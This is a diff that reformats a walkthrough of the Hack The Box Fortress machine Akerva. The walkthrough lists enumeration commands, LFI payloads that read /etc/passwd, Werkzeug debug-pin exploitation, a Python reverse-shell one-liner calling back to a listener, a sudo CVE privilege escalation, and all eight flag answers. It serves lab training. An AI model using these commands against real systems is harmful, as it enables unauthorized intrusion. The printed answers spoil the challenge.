@@ -1,144 +1,213 @@
-Walkthrough for HTB Fortress (Akerva)
+# Walkthrough for HTB Fortress (Akerva)
 
 This walkthrough covers the steps to complete the HTB (Hack The Box) Fortress machine, Akerva.
-1. Plain Sight
 
-    Scan with Nmap: Run a simple Nmap scan to identify open ports and services on the target machine (10.13.37.11):
+---
 
-    nmap -sC -sV -Pn 10.13.37.11
+## 1. Plain Sight
 
-        Ports: 22, 80, 5000 are open.
+### Scan with Nmap
+Run a simple Nmap scan to identify open ports and services on the target machine (10.13.37.11):
 
-    Browse to http://10.13.37.11/: Visiting the website and inspecting the source code reveals Flag 1:
+```bash
+nmap -sC -sV -Pn 10.13.37.11
+```
 
-    Flag 1: AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}
+**Ports Open:** 22, 80, 5000
 
-2. Take a Look Around
+### Browse the Website
+Visit `http://10.13.37.11/` and inspect the source code to find **Flag 1**:
 
-    SNMP Enumeration: Use nmap to check for SNMP (Simple Network Management Protocol) vulnerabilities:
+**Flag 1:** `AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}`
 
+---
+
+## 2. Take a Look Around
+
+### SNMP Enumeration
+Use Nmap to check for SNMP (Simple Network Management Protocol) vulnerabilities:
+
+```bash
 sudo nmap -sU 10.13.37.11
+```
 
-Or use tools like snmp-check or snmpwalk:
+Alternatively, use tools like `snmp-check` or `snmpwalk`:
 
-    snmp-check -c public -v 2c 10.13.37.11 -d
+```bash
+snmp-check -c public -v 2c 10.13.37.11 -d
+```
 
-    Flag 2 from SNMP enumeration:
+From SNMP enumeration, retrieve **Flag 2**:
 
-    Flag 2: AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
+**Flag 2:** `AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}`
 
-3. Dead Poets
+---
 
-    Files found:
-        /dev/space_dev.py
-        /var/www/html/scripts/backup_every_17minutes.sh
+## 3. Dead Poets
 
-    Exploit the Backup Script: The script backs up the website every 17 minutes. The backups are stored in the /backups/ folder.
+### Key Files Found
+- `/dev/space_dev.py`
+- `/var/www/html/scripts/backup_every_17minutes.sh`
 
-    Using a simple curl request:
+### Exploit the Backup Script
+The script backs up the website every 17 minutes, storing backups in the `/backups/` folder.
 
-    curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
+Trigger the script using:
 
-    Flag 3: AKERVA{IKNoW###VeRbTamper!nG_==}
+```bash
+curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
+```
 
-4. Now You See Me
+Retrieve **Flag 3**:
 
-    Investigating the Backup Process:
+**Flag 3:** `AKERVA{IKNoW###VeRbTamper!nG_==}`
 
-        The backup script creates a zip file named like backup_$timestamp.zip and stores it in /backups/.
+---
 
-        Determine the time of the server using an HTTP request:
+## 4. Now You See Me
 
-curl -I http://10.13.37.11
+### Investigating the Backup Process
+The backup script creates zip files named `backup_$timestamp.zip` stored in `/backups/`.
 
-Example output:
+1. Determine the server’s time:
 
-Date: Mon, 20 Jul 2020 19:51:44 GMT
+    ```bash
+    curl -I http://10.13.37.11
+    ```
 
-    Use wfuzz to brute force the backup file name:
+    Example output:
 
-wfuzz -u http://10.13.37.11/backups/backup_2020072020FUZZ.zip -w wordlist.txt --hc 404
+    ```
+    Date: Mon, 20 Jul 2020 19:51:44 GMT
+    ```
 
-Generate a wordlist using crunch:
+2. Use `wfuzz` to brute force the backup file name:
 
-crunch 4 4 0123456789 -o wordlist.txt
+    ```bash
+    wfuzz -u http://10.13.37.11/backups/backup_2020072020FUZZ.zip -w wordlist.txt --hc 404
+    ```
 
-    After finding the correct file name, download the file:
+3. Generate a wordlist using `crunch`:
 
+    ```bash
+    crunch 4 4 0123456789 -o wordlist.txt
+    ```
+
+4. Download the correct file:
+
+    ```bash
     wget http://10.13.37.11/backups/backup_2020072020{4525}.zip
+    ```
 
-    Check Space_dev.py for credentials (likely for Flag 4): Flag 4: AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}
+### Check `space_dev.py`
+Extract credentials or **Flag 4**:
 
-5. Open Book
+**Flag 4:** `AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}`
 
-    Web Application on Port 5000: After inspecting the source code, use fuzzing techniques (e.g., dirsearch or wfuzz) to find hidden directories and endpoints:
+---
 
+## 5. Open Book
+
+### Web Application on Port 5000
+Inspect the source code and use fuzzing techniques (e.g., `dirsearch` or `wfuzz`) to find hidden directories and endpoints:
+
+```bash
 python3 dirsearch.py -u http://10.13.37.11:5000/ -e php
+```
 
-Results reveal three folders:
+**Discovered Folders:**
+- `/console`
+- `/download`
+- `/file`
 
-    /console
-    /download
-    /file
+### Exploiting LFI (Local File Inclusion)
+The `/file` endpoint can be exploited for LFI:
 
-Exploiting LFI (Local File Inclusion): The /file endpoint can be exploited for LFI by accessing files like /etc/passwd and /home/aas/flag.txt.
+```bash
+http://10.13.37.11:5000/file?filename=../../../../../etc/passwd
+http://10.13.37.11:5000/file?filename=../../../../../home/aas/flag.txt
+```
 
-Example:
+Retrieve **Flag 5**:
 
-    http://10.13.37.11:5000/file?filename=../../../../../etc/passwd
-    http://10.13.37.11:5000/file?filename=../../../../../home/aas/flag.txt
+**Flag 5:** `AKERVA{IKNOW#LFi_@_}`
 
-    Flag 5: AKERVA{IKNOW#LFi_@_}
+---
 
-6. Say Friend and Enter
+## 6. Say Friend and Enter
 
-    Werkzeug Console Pin: The /console endpoint prompts for a pin. The machine uses Werkzeug's debug mode, which can be exploited with a script to retrieve the pin.
+### Werkzeug Console Pin
+The `/console` endpoint prompts for a pin. Exploit Werkzeug's debug mode:
 
-    Follow the steps provided to generate the pin:
-        Get system information (MAC address, machine-id) via LFI.
-        Use the information to generate the pin:
+1. Gather system information (MAC address, machine-id) via LFI.
+2. Use the information to generate the pin:
 
-python exploit.py
+    ```bash
+    python exploit.py
+    ```
 
-    The key to access the console is: 151-392-393.
+**Generated Pin:** `151-392-393`
 
-Getting Reverse Shell: Once inside the console, initiate a reverse shell back to your listener using the following Python command:
+### Getting Reverse Shell
+Once inside the console, initiate a reverse shell back to your listener:
 
+**Reverse Shell Command:**
+
+```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.37.8",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
 
-On your listener:
+**Listener Command:**
 
+```bash
 nc -lnvp 1234
+```
 
-Use pty for a better shell:
+Upgrade to a better shell:
 
-    python -c 'import pty;pty.spawn("/bin/bash")'
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
-    Flag 6: AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
+Retrieve **Flag 6**:
 
-7. Super Mushroom
+**Flag 6:** `AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}`
 
-    Exploit CVE-2019-18634: The system is running an old version of sudo (1.8.21p2), which is vulnerable to CVE-2019-18634.
+---
 
-    Follow these steps:
-        Download and compile the exploit from GitHub.
-        Set up a web server to serve the compiled file to the victim machine.
-        On the victim machine, use wget to download the file and execute it.
+## 7. Super Mushroom
 
-    After successful execution, gain root privileges and get a root shell.
+### Exploit CVE-2019-18634
+The system runs an old version of sudo (1.8.21p2), vulnerable to CVE-2019-18634:
 
-    Flag 7: AKERVA{IkNow_Sud0_sUckS!}
+1. Download and compile the exploit from GitHub.
+2. Serve the file via a web server.
+3. On the victim machine, download and execute it.
 
-8. Little Secret
+After gaining root privileges, retrieve **Flag 7**:
 
-    Base64 Decoding: Decoding the string from secured_note.md using CyberChef, you get:
+**Flag 7:** `AKERVA{IkNow_Sud0_sUckS!}`
 
-    GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
+---
 
-    Further decoding with Vigenère cipher gives:
+## 8. Little Secret
 
-    Flag 8: AKERVA{IKNOOOWVIGEEENERRRE}
+### Base64 Decoding
+Decode the string from `secured_note.md` using CyberChef:
 
-Conclusion:
+**String:**
+
+```
+GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
+```
+
+Further decoding with a Vigenère cipher reveals **Flag 8**:
+
+**Flag 8:** `AKERVA{IKNOOOWVIGEEENERRRE}`
+
+---
+
+## Conclusion
 
 You have completed the HTB Fortress (Akerva) machine by following the steps to gain access to different services, exploit vulnerabilities, and escalate privileges, ultimately obtaining all flags.
+
